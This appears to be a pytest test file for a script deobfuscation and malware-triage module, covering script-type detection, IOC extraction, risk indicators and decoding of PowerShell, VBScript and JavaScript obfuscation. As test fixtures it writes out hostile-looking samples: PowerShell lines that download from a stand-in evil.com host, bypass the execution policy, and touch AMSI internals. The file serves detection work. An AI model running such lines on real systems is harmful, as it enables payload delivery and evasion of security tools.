"""Tests for HashGuard script deobfuscator module."""

import os
import tempfile

import pytest

from hashguard.deobfuscator import (
    DeobfuscationLayer,
    DeobfuscationResult,
    _check_risk_indicators,
    _deobfuscate_js_charcode,
    _deobfuscate_js_hex,
    _deobfuscate_js_unicode,
    _deobfuscate_ps_base64,
    _deobfuscate_ps_charcode,
    _deobfuscate_vbs_chr,
    _deobfuscate_vbs_strreverse,
    _detect_script_type,
    _extract_iocs,
    analyze_script,
)

# ── Dataclasses ──────────────────────────────────────────────────────────────


class TestDeobfuscationLayer:
    def test_fields(self):
        layer = DeobfuscationLayer(
            technique="base64",
            description="desc",
            original="abc",
            result="decoded",
            confidence="high",
        )
        assert layer.technique == "base64"
        assert layer.confidence == "high"


class TestDeobfuscationResult:
    def test_defaults(self):
        r = DeobfuscationResult()
        assert r.script_type == "unknown"
        assert r.obfuscation_detected is False
        assert r.layers == []

    def test_to_dict(self):
        layer = DeobfuscationLayer(technique="t", description="d", result="r")
        r = DeobfuscationResult(
            script_type="powershell",
            obfuscation_detected=True,
            layers=[layer],
            decoded_strings=["hello"],
            risk_indicators=["Downloads content from the internet"],
        )
        d = r.to_dict()
        assert d["script_type"] == "powershell"
        assert d["obfuscation_detected"] is True
        assert len(d["layers"]) == 1
        assert d["decoded_strings"] == ["hello"]


# ── Script type detection ────────────────────────────────────────────────────


class TestDetectScriptType:
    def test_by_extension(self):
        assert _detect_script_type("", "script.ps1") == "powershell"
        assert _detect_script_type("", "thing.vbs") == "vbscript"
        assert _detect_script_type("", "code.js") == "javascript"
        assert _detect_script_type("", "run.bat") == "batch"
        assert _detect_script_type("", "app.hta") == "hta"

    def test_by_content_powershell(self):
        assert _detect_script_type("Invoke-Expression $cmd") == "powershell"

    def test_by_content_vbscript(self):
        assert _detect_script_type('Set obj = CreateObject("Wscript.Shell")') == "vbscript"

    def test_by_content_javascript(self):
        assert _detect_script_type("var x = function() { eval('code'); }") == "javascript"

    def test_by_content_batch(self):
        assert _detect_script_type("@echo off\nset /a x=1") == "batch"

    def test_unknown(self):
        assert _detect_script_type("just plain text") == "unknown"


# ── IOC extraction ───────────────────────────────────────────────────────────


class TestExtractIOCs:
    def test_urls(self):
        iocs = _extract_iocs("visit http://evil.com/payload and https://bad.org/file")
        urls = [i for i in iocs if i["type"] == "url"]
        assert len(urls) == 2

    def test_ips(self):
        iocs = _extract_iocs("connect to 8.8.8.8 then 1.2.3.4")
        ips = [i for i in iocs if i["type"] == "ip"]
        assert len(ips) == 2

    def test_domains(self):
        iocs = _extract_iocs("resolve malware.xyz and c2.evil.com")
        domains = [i for i in iocs if i["type"] == "domain"]
        assert len(domains) >= 1

    def test_skips_private_ips(self):
        iocs = _extract_iocs("127.0.0.1 10.0.0.1 192.168.1.1")
        ips = [i for i in iocs if i["type"] == "ip"]
        assert len(ips) == 0

    def test_emails(self):
        iocs = _extract_iocs("send to attacker@evil.com")
        emails = [i for i in iocs if i["type"] == "email"]
        assert len(emails) == 1


# ── Risk indicators ──────────────────────────────────────────────────────────


class TestRiskIndicators:
    def test_detects_download(self):
        indicators = _check_risk_indicators("DownloadString('http://evil.com')")
        assert any("Downloads" in i for i in indicators)

    def test_detects_iex(self):
        indicators = _check_risk_indicators("IEX ($code)")
        assert any("Dynamic code" in i or "Invoke-Expression" in i for i in indicators)

    def test_detects_amsi_bypass(self):
        indicators = _check_risk_indicators("[Ref].Assembly.GetType('AmsiUtils')")
        assert any("AMSI" in i for i in indicators)

    def test_clean_text(self):
        indicators = _check_risk_indicators("Write-Host 'Hello World'")
        assert len(indicators) == 0


# ── PowerShell deobfuscation ─────────────────────────────────────────────────


class TestPSBase64:
    def test_encoded_command(self):
        import base64

        payload = "Write-Host 'pwned'"
        encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        content = f"powershell -EncodedCommand {encoded}"
        layers = _deobfuscate_ps_base64(content)
        assert len(layers) >= 1
        assert "pwned" in layers[0].result

    def test_no_match(self):
        layers = _deobfuscate_ps_base64("echo hello")
        assert layers == []


class TestPSCharcode:
    def test_char_concat(self):
        # [char]72+[char]101+[char]108 = "Hel"
        content = "[char]72+[char]101+[char]108+[char]108+[char]111"
        layers = _deobfuscate_ps_charcode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


# ── VBScript deobfuscation ───────────────────────────────────────────────────


class TestVBSChr:
    def test_chr_concat(self):
        content = "x = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)"
        layers = _deobfuscate_vbs_chr(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestVBSStrReverse:
    def test_strreverse(self):
        content = 'x = StrReverse("dlroW olleH")'
        layers = _deobfuscate_vbs_strreverse(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello World"


# ── JavaScript deobfuscation ─────────────────────────────────────────────────


class TestJSCharCode:
    def test_fromcharcode(self):
        content = "String.fromCharCode(72,101,108,108,111)"
        layers = _deobfuscate_js_charcode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestJSHex:
    def test_hex_string(self):
        content = r"\x48\x65\x6c\x6c\x6f"
        layers = _deobfuscate_js_hex(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestJSUnicode:
    def test_unicode_escape(self):
        content = r"\u0048\u0065\u006c\u006c\u006f"
        layers = _deobfuscate_js_unicode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


# ── Full analysis ────────────────────────────────────────────────────────────


class TestAnalyzeScript:
    def test_nonexistent_file(self):
        result = analyze_script("/nonexistent/script.ps1")
        assert isinstance(result, DeobfuscationResult)
        assert result.obfuscation_detected is False

    def test_empty_script(self, tmp_path):
        f = tmp_path / "empty.ps1"
        f.write_text("")
        result = analyze_script(str(f))
        assert result.obfuscation_detected is False

    def test_powershell_with_encoded_command(self, tmp_path):
        import base64

        payload = "Invoke-WebRequest http://evil.com/payload"
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        f = tmp_path / "dropper.ps1"
        f.write_text(f"powershell -EncodedCommand {enc}")
        result = analyze_script(str(f))
        assert result.script_type == "powershell"
        assert result.obfuscation_detected is True
        assert len(result.layers) >= 1

    def test_vbscript_chr(self, tmp_path):
        f = tmp_path / "obf.vbs"
        f.write_text("x = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105)\nExecute x")
        result = analyze_script(str(f))
        assert result.script_type == "vbscript"
        assert result.obfuscation_detected is True

    def test_javascript_charcode(self, tmp_path):
        f = tmp_path / "obf.js"
        f.write_text("var x = String.fromCharCode(101,118,97,108); eval(x);")
        result = analyze_script(str(f))
        assert result.script_type == "javascript"
        assert result.obfuscation_detected is True

    def test_batch_set_vars(self, tmp_path):
        # Need at least 3 SET assignments and concatenated usage
        f = tmp_path / "obf.bat"
        f.write_text(
            "@echo off\n"
            'set "a=pow"\n'
            'set "b=ersh"\n'
            'set "c=ell"\n'
            '%a%%b%%c% -Command "Get-Date"\n'
        )
        result = analyze_script(str(f))
        assert result.script_type == "batch"

    def test_risk_indicators_in_output(self, tmp_path):
        f = tmp_path / "risky.ps1"
        f.write_text(
            "$wc = New-Object System.Net.WebClient\n"
            "$wc.DownloadString('http://evil.com/payload')\n"
            "Set-ExecutionPolicy Bypass -Force\n"
        )
        result = analyze_script(str(f))
        assert len(result.risk_indicators) >= 2
